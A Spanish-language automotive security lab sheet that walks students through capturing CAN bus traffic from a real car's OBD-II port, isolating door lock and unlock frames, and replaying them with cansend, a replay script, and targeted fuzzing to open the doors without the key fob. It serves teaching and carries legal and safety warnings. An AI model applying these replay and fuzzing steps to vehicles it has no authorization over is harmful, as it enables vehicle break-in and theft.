# Práctica E — Ataque de Replay en vehículo real

[Bertsioa euskaraz](08_Practica_E_Coche_Real_eu.md)

**Duración estimada:** 60 minutos  
**Dificultad:** Alta  
**Herramientas:** `candump`, `cansend`, `scripts/replay_attack.py`, SavvyCAN, adaptador CAN-USB

---

## Objetivo

Conectar un adaptador CAN-USB al puerto OBD-II de un vehículo real, capturar pasivamente el tráfico del bus CAN de carrocería, identificar las tramas de bloqueo/desbloqueo de puertas mediante correlación, y reproducirlas para activar el desbloqueo sin usar el mando original.

---

## Contexto

Las técnicas aplicadas en las prácticas anteriores sobre ICSim son exactamente las mismas que se usan sobre vehículos reales. El protocolo CAN no tiene:
- Autenticación de origen de trama.
- Cifrado.
- Mecanismos anti-replay.

Esto significa que cualquier dispositivo conectado al bus puede leer todo el tráfico y enviar cualquier comando. Miller & Valasek demostraron en DEF CON 2015 que esto permite tomar control remoto de frenos, dirección y transmisión. En esta práctica el objetivo es más conservador: **identificar y reproducir la señal de desbloqueo de puertas**.

> ⚠️ **Aviso legal y de seguridad:**
> - Realizar únicamente sobre un vehículo propio o con autorización expresa del propietario.
> - El vehículo debe estar estacionado, con el motor en marcha o contacto puesto.
> - No inyectar tramas mientras el vehículo está en movimiento.
> - No modificar tramas relacionadas con dirección, frenos ni airbags.
> - Guardar capturas solo en equipos del curso — no distribuir logs de un vehículo real.

---

## Arquitectura de buses en un vehículo típico

```
┌─────────────────────────────────────────────────────────┐
│  HS-CAN  500 kbps   Motor, ABS, transmisión, airbags    │
│  MS-CAN  125/250 kbps  Puertas, luces, climatización   │  ← objetivo de esta práctica
│  LIN bus  Sensores individuales (ventanas, asientos)    │
│                          │                              │
│                    [Gateway ECU]                        │
│                          │                              │
│                    [Puerto OBD-II]  ← punto de acceso  │
└─────────────────────────────────────────────────────────┘
```

> En vehículos anteriores a 2018, el OBD-II suele exponer ambos buses (HS-CAN y MS-CAN).
> En vehículos más modernos con gateway, puede que solo sea accesible el HS-CAN desde OBD-II.

---

## Hardware necesario

| Dispositivo | Precio aprox. | Notas |
|---|---|---|
| **CANable v2** | ~25€ | Recomendado — SocketCAN nativo en Linux, sin drivers |
| PEAK PCAN-USB | ~300€ | Profesional, muy estable |
| USBtin | ~50€ | Económico, compatible SocketCAN |
| **Cable OBD-II macho a terminales** | ~5€ | Para conectar al coche sin modificar nada |
| Portátil Linux (o VM Linux) | — | Con USB disponible |

**Pinout OBD-II → adaptador CAN:**

```
OBD-II pin 6  →  CAN-H
OBD-II pin 14 →  CAN-L
OBD-II pin 16 →  +12V  (alimentación del adaptador, si lo requiere)
OBD-II pin 4/5 → GND
```

---

## Prerrequisitos

- Prácticas A, B y C completadas sobre ICSim.
- Adaptador CAN-USB disponible y conectado al portátil.
- Vehículo estacionado con contacto puesto o motor en marcha.
- `can-utils` instalado: `sudo apt install -y can-utils`
- SavvyCAN disponible (`./SavvyCAN.AppImage`).

---

## Ejercicio E.1 — Configurar la interfaz CAN

### Levantar la interfaz

Con **CANable v2** (aparece como `/dev/ttyACM0` o `/dev/ttyUSB0`):

```bash
# Identificar el dispositivo
ls /dev/ttyACM* /dev/ttyUSB*

# Levantar interfaz a 500 kbps (HS-CAN — velocidad estándar powertrain)
sudo slcand -o -c -s6 /dev/ttyACM0 can0
sudo ip link set can0 up

# Verificar
ip link show can0
```

| Velocidad | Código `slcand` | Bus habitual |
|---|---|---|
| 125 kbps | `-s4` | LIN gateway, algunos MS-CAN |
| 250 kbps | `-s5` | MS-CAN carrocería |
| 500 kbps | `-s6` | HS-CAN motor/ABS ← empezar aquí |
| 1 Mbps | `-s8` | Algunos vehículos modernos |

### Verificar tráfico

```bash
candump can0
```

Si aparecen tramas continuamente → estás en el bus correcto a la velocidad correcta.  
Si no aparece nada → probar otra velocidad (cambiar `-s6` por `-s5`).

```
# Salida esperada (ejemplo):
  can0  0244   [8]  00 00 00 50 00 00 00 00
  can0  0316   [8]  1F 00 00 00 00 00 00 00
  can0  0188   [3]  00 00 00
```

> Si el bus está a 500 kbps pero las puertas son MS-CAN a 250 kbps, necesitarás un segundo adaptador o un adaptador dual-bus (PEAK PCAN-USB Pro).

---

## Ejercicio E.2 — Captura correlacionada

El objetivo es capturar el tráfico **mientras se accionan las puertas con el mando original**, para poder correlacionar la acción física con la trama CAN.

### Procedimiento

**Terminal 1 — iniciar captura:**
```bash
candump -l can0
# Crea automáticamente: candump-YYYYMMDD-HHMMSS.log
```

**Terminal 2 — registrar eventos con timestamp:**
```bash
echo "$(date +%s%3N) INICIO_CAPTURA" >> eventos.txt

# Esperar 3 segundos en reposo...

echo "$(date +%s%3N) BLOQUEO" >> eventos.txt
# → pulsar el botón de BLOQUEAR en el mando físico
# → esperar 2 segundos
echo "$(date +%s%3N) FIN_BLOQUEO" >> eventos.txt

# Esperar 3 segundos en reposo...

echo "$(date +%s%3N) DESBLOQUEO" >> eventos.txt
# → pulsar el botón de DESBLOQUEAR en el mando físico
# → esperar 2 segundos
echo "$(date +%s%3N) FIN_DESBLOQUEO" >> eventos.txt

# Repetir el ciclo 3 veces para confirmar consistencia
```

**Parar la captura:**
```bash
# Ctrl+C en Terminal 1
ls -lh candump-*.log   # verificar que el fichero tiene contenido
```

---

## Ejercicio E.3 — Análisis con SavvyCAN

### Cargar la captura

```bash
./SavvyCAN.AppImage
# File → Load Frames → seleccionar candump-*.log
```

### Identificar las tramas de puerta

1. Observar la lista de IDs — los buses de carrocería suelen tener IDs en el rango `0x100`–`0x4FF`
2. Buscar IDs que **aparecen en ráfaga corta** (2–5 tramas) en los momentos de bloqueo/desbloqueo
3. Los comandos de puerta tienen características típicas:
   - DLC de 1 a 4 bytes
   - Aparecen solo cuando se acciona el mando (no son periódicos)
   - El mismo ID tiene datos distintos para bloquear y desbloquear

### Filtrar por ventana temporal

En SavvyCAN:  
**Tools → Signal Viewer** → ordenar por tiempo → localizar el rango de timestamps del evento `BLOQUEO` en `eventos.txt`

O directamente con `grep` sobre el log (el log incluye timestamps en segundos):
```bash
# Ver solo las tramas en los 2 segundos posteriores al evento BLOQUEO
# (ajustar el timestamp según eventos.txt)
awk '$1 >= 1234567890.000 && $1 <= 1234567892.000' candump-*.log
```

### Anotar los candidatos

Documenta en el informe los IDs sospechosos:

| ID | DLC | Datos en bloqueo | Datos en desbloqueo |
|---|---|---|---|
| `0x???` | ? | `?? ?? ??` | `?? ?? ??` |

---

## Ejercicio E.4 — Replay del desbloqueo

### Opción A — `cansend` directo

Una vez identificada la trama de desbloqueo:

```bash
# Sustituir ID y datos por los encontrados en E.3
cansend can0 3B0#020000

# Si el coche requiere ráfaga:
for i in {1..5}; do cansend can0 3B0#020000; sleep 0.01; done
```

### Opción B — Script de replay con ventana temporal

```bash
# Extraer solo las tramas del intervalo de desbloqueo del log completo
python3 scripts/replay_attack.py \
    --interface can0 \
    --file candump-*.log \
    --filter 0x3B0 \
    --start 1234567893.000 \
    --end   1234567895.000
```

### Resultado esperado

Las puertas se desbloquean sin haber usado el mando físico.

> Si no hay respuesta, comprobar:
> 1. ¿El ID correcto? — repetir E.3 con más detalle
> 2. ¿Estás en el bus correcto? — las puertas pueden estar en MS-CAN a 250 kbps
> 3. ¿El coche requiere varias tramas en secuencia? — usar replay completo del intervalo

---

## Ejercicio E.5 — Fuzzing dirigido (si E.3 no identifica el ID)

Si no consigues aislar la trama por correlación, aplica fuzzing sobre el rango de IDs típicos de carrocería:

```bash
# Barrer valores del byte 0 en un ID sospechoso
python3 scripts/fuzz_can.py \
    --interface can0 \
    --id 0x3B0 \
    --byte 0 \
    --min 0x00 \
    --max 0x0F \
    --interval 0.5
```

Observar físicamente cuándo reaccionan las puertas. **Tener a alguien mirando el coche** mientras se ejecuta el fuzzing.

> ⚠️ El fuzzing puede activar otras funciones (alarma, luces, claxon). Tenerlo en cuenta antes de ejecutar.

---

## Comparativa ICSim vs vehículo real

| Aspecto | ICSim (simulador) | Vehículo real |
|---|---|---|
| IDs conocidos | Sí (documentados) | No — hay que descubrirlos |
| Número de IDs en bus | ~10 | 50–200+ |
| Buses múltiples | No | Sí (HS/MS/LIN) |
| Gateway | No | Posible en modelos post-2018 |
| Riesgo de daño | Ninguno | Bajo si solo se captura y hace replay de puertas |
| Resultado visible | Pantalla simulada | Puerta real que se abre |

---

## Preguntas de reflexión

1. ¿En qué se diferencia el proceso de ingeniería inversa en un vehículo real respecto al simulador ICSim?
2. ¿Por qué es más difícil aislar la trama de puerta en un bus real que en ICSim?
3. ¿Qué medida de seguridad podría implementar un fabricante para que este replay no funcionase?
4. ¿Qué diferencia hay entre un ataque de replay grabado en el parking y un ataque en tiempo real?
5. ¿Cómo afecta la presencia de un gateway CAN a la viabilidad de este ataque desde el OBD-II?

---

## Evidencias para el informe

- [ ] Captura de pantalla de `ip link show can0` con la interfaz UP
- [ ] Fragmento del log `candump-*.log` mostrando el ID identificado
- [ ] Captura de SavvyCAN con el ID candidato seleccionado
- [ ] Captura de pantalla o vídeo del momento en que las puertas se desbloquean
- [ ] Tabla de IDs candidatos documentada (Ejercicio E.3)
- [ ] Respuestas a las preguntas de reflexión
